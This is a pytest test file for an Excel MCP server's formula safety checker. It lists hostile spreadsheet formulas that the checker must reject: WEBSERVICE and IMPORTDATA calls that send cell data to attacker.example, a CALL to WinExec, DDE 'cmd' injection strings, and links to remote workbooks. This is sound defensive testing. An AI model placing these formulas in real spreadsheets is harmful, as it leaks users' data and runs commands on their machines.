import pytest

from excel_mcp.errors import UnsafeFormulaError
from excel_mcp.formulas import check_formula

SHEETS = ["Sheet1", "Sheet2", "Sheet3", "My Sheet", "Data", "Q1.Sales", "Report.v2", "Wow!", "It's"]


@pytest.mark.parametrize(
    "formula",
    [
        "=SUM(A1:A10)",
        "=IF(B2>0,B2*1.2,0)",
        "=_xlfn.XLOOKUP(A2,Sheet2!A:A,Sheet2!B:B)",
        "=SUM(Table1[Sales])",
        "=Table1[[#This Row],[Units]]*2",
        "='My Sheet'!A1+1",
        "=SUM(Sheet1:Sheet3!A1)",
        "=SUM('Sheet1:My Sheet'!A1)",
        "='Q1.Sales'!A1+Report.v2!B2",
        "=sheet1!A1+DATA!B2",
        "=SUM(A1:INDEX(B:B,3))",
        "=Sheet1!A1:OFFSET(A1,2,0)",
        "=Sheet1!A1:Sheet1!B2",
        "=Table1[[Col1]:[Col2]]",
        "=[@Units]*2",
        # Columns PY, DDE and RTD share their names with blocked functions.
        "=SUM(PY:PY)+SUM(A:RTD)",
        "=Sheet1!DDE:DDE",
        "='Wow!'!A1+'It''s'!A1+Sheet1!#REF!",
        '="a|b"&A1',
        '=CONCAT("see ","https://example.com")',
        "=LET(x,A1*2,x+1)",
    ],
)
def test_safe_formulas_are_accepted(formula: str) -> None:
    check_formula(formula, SHEETS)


@pytest.mark.parametrize(
    "formula",
    [
        '=WEBSERVICE("https://attacker.example/?d="&A1)',
        '=webservice("https://attacker.example")',
        '=WebService("https://attacker.example")',
        '=_xlfn.WEBSERVICE("https://attacker.example")',
        '=FILTERXML(WEBSERVICE("https://x"),"//a")',
        '=HYPERLINK("https://phish.example","Click")',
        '=IMAGE("https://tracker.example/pixel.png")',
        '=INDIRECT("A"&B1)',
        '=RTD("server",,"topic")',
        '=CALL("kernel32","WinExec","JCJ","calc",0)',
        '=INFO("directory")',
        "=SUM(IF(A1>0,WEBSERVICE(B1),0))",
        '=webservice ("https://attacker.example")',
        '=_xlfn.WEBSERVICE ("https://attacker.example")',
        '=IMPORTXML("https://attacker.example","//a")',
        '=importdata("https://attacker.example/?d="&A1)',
        '=@WEBSERVICE("https://attacker.example")',
        '=@_xlfn.IMAGE("https://attacker.example/p.png")',
        '=_xlfn._xlfn.WEBSERVICE("https://attacker.example")',
        '=_xlfn.MAP("https://attacker.example",_xleta.WEBSERVICE)',
        '=Sheet1!WEBSERVICE("https://attacker.example")',
        '=CELL("filename",A1)',
        '=SUM(A1:INDIRECT("B2"))',
        '=Sheet1!A1:INDIRECT("B2")',
        '=A1:WEBSERVICE("https://attacker.example")',
        '=A1:@_xlfn.WEBSERVICE("https://attacker.example")',
    ],
)
def test_dangerous_functions_are_rejected(formula: str) -> None:
    with pytest.raises(UnsafeFormulaError, match="not allowed"):
        check_formula(formula, SHEETS)


@pytest.mark.parametrize(
    "formula",
    [
        "=[1]Sheet1!A1",
        "='C:\\data\\[secrets.xlsx]Sheet1'!A1",
        "=SUM([book.xlsx]Sheet1!A1:A3)",
        "=SUM([Book2.xlsx]Sheet1:Sheet3!A1)",
        "=[1]!Name",
        # Links to a defined name in another workbook have no brackets.
        "=SUM(Budget.xlsx!Sales)",
        "=Book1!Sales",
        r"='C:\Reports\Budget.xlsx'!Sales",
        r"='\\203.0.113.7\share\book.xlsx'!Sales",
        "='https://attacker.example/book.xlsx'!Sales",
        "='Macintosh HD:Users:me:Budget'!Sales",
        "=IF(A1>0,'Old Book.xls'!Total,0)",
        "=Budget.xlsx!A1:Sheet2!B2",
        "='Budget.xlsx'!#REF!",
        # A function in another workbook, or a reference that ends in a function call.
        r"='\\203.0.113.7\share\book.xlsm'!MyFunc()",
        "=Budget.xlsm!MyFunc(A1)",
        "=SUM([1]Sheet1!A1:OFFSET(A1,0,0))",
        # A sheet that does not exist is read as another workbook.
        "=Missing!A1",
        "=SUM(Sheet1:Missing!A1)",
    ],
)
def test_external_workbook_references_are_rejected(formula: str) -> None:
    with pytest.raises(UnsafeFormulaError, match="other workbooks"):
        check_formula(formula, SHEETS)


@pytest.mark.parametrize("formula", ["=cmd|' /C calc'!A0", "=cmd|'/c calc'!'A0'"])
def test_dde_is_rejected(formula: str) -> None:
    with pytest.raises(UnsafeFormulaError):
        check_formula(formula, SHEETS)


def test_formula_must_start_with_equals() -> None:
    with pytest.raises(UnsafeFormulaError, match="start with"):
        check_formula("SUM(A1)", SHEETS)


def test_unknown_sheet_error_lists_the_sheets() -> None:
    with pytest.raises(UnsafeFormulaError, match=r"'Q3' .* Sheets: Q1, Q2"):
        check_formula("=Q3!A1", ["Q1", "Q2"])
